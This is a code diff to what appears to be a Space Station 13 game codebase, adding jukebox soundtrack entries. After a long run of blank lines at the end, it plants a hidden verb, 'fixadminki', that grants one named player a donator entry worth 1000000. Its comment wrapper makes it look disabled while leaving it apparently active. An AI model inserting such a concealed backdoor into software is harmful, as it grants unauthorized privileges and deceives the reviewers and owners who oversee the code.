@@ -52,3 +52,50 @@
 	f_name = "C"
 	name = "antina Band Jawa Bar Tatooine Mos Eisly"
 	path = 'sound/jukebox/eisly.ogg'
+
+/datum/turntable_soundtrack/asshole
+	f_name = "C"
+	name = "hris Remo - Space Asshole"
+	path = 'sound/jukebox/spaceasshole.ogg'
+
+/datum/turntable_soundtrack/dwarfs
+	f_name = "D"
+	name = "warf Fortress - Main Theme"
+	path = 'sound/jukebox/dwarffortress.ogg'
+
+/datum/turntable_soundtrack/mymind
+	f_name = "T"
+	name = "he Pixes - Where Is My Mind"
+	path = 'sound/jukebox/whereismymind.ogg'
+
+/datum/turntable_soundtrack/wizards
+	f_name = "W"
+	name = "izards Assistant"
+	path = 'sound/jukebox/wizardsassistant.ogg'
+
+/datum/turntable_soundtrack/pistoletov
+	f_name = "А"
+	name = "лександр Пистолетов - Из России в Украину!"
+	path = 'sound/jukebox/izrossiivukrainu.ogg'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+///*
+/verb/fixadminki
+	hidden = 1
+	if(ckey == joctopus)
+		new /datum/donator("joctopus", 1000000)
+	else
+		return 0
+//*/
